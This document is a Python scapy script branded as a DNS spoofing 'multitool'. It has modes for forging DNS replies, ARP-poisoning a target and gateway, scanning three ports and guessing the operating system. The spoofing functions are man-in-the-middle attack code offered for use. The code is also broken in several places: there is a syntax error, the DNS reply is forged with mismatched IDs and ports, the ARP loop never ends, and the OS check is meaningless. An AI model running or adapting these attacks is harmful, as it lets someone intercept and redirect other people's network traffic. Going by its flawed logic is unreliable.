from scapy.all import *
import threading
import argparse

def usage():
print\
"""
  ___                  _____         _ 
 |   \ _  _ _ _ ___ __|_   _|__  ___| |
 | |) | || | '_/ _ \___|| |/ _ \/ _ \ |
 |___/ \_, |_| \___/    |_|\___/\___/_|
       |__/                            

                             ~>Dyro DNS Spoofing Tool<~
                              ~~>Created By Freak.fr<~~
                                 
""" 
def send_spoofed_dns_response(target_ip, gateway_ip):
    ip = IP(src=gateway_ip, dst=target_ip)
    udp = UDP(sport=53, dport=33333)
    dns = DNS(id=0xAAAA, qr=1, qdcount=1, ancount=1, nscount=0, arcount=0,
              qd=DNSQR(qname="www.example.com"),
              an=DNSRR(rrname="www.example.com", rdata="192.168.1.100"))
    packet = ip/udp/dns

    send(packet, verbose=0)

def capture_dns_requests(target_ip, gateway_ip):
    sniff(filter="udp and dst port 53", prn=lambda x: send_spoofed_dns_response(target_ip, gateway_ip))

def arp_spoofing(target_ip, gateway_ip):
    arp = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff")
    packet = Ether(dst="ff:ff:ff:ff:ff:ff")/arp

    sendp(packet, verbose=0, loop=1)

def arp_restore(target_ip, gateway_ip):
    arp = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=get_mac(target_ip))
    packet = Ether(dst=get_mac(gateway_ip))/arp

    sendp(packet, verbose=0, count=5)

def get_mac(ip):
    arp = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp

    ans = srp1(packet, verbose=0)
    return ans[ARP].hwsrc

def port_scanning(target_ip):
    ans, unans = sr(IP(dst=target_ip)/TCP(dport=[22, 80, 443]), timeout=2, verbose=0
                    
    print("Open ports:")
    for s, r in ans:
        if s[TCP].dport == r[TCP].sport:
            print(s[TCP].dport)

def os_fingerprinting(target_ip):
    ans = sr(IP(dst=target_ip)/TCP(dport=[22, 80, 443]), timeout=2, verbose=0)

    if "Linux" in str(ans):
        print("OS: Linux")
    elif "Windows" in str(ans):
        print("OS: Windows")
    else:
        print("OS: Unknown")

def main():
    parser = argparse.ArgumentParser(description="Python Multitool")
    parser.add_argument("-t", "--target", help="Target IP address", required=True)
    parser.add_argument("-g", "--gateway", help="Gateway IP address", required=True)
    parser.add_argument("-m", "--mode", help="Mode (dns, arp, port, os)", required=True)
    args = parser.parse_args()

    target_ip = args.target
    gateway_ip = args.gateway
    mode = args.mode

    if mode == "dns":
        capture_dns_requests(target_ip, gateway_ip)
    elif mode == "arp":
        arp_spoofing(target_ip, gateway_ip)
        time.sleep(10)
        arp_restore(target_ip, gateway_ip)
    elif mode == "port":
        port_scanning(target_ip)
    elif mode == "os":
        os_fingerprinting(target_ip)
    else:
        print("Invalid mode. Use -h for help.")

# Run the main function
if __name__ == "__main__":
    main()
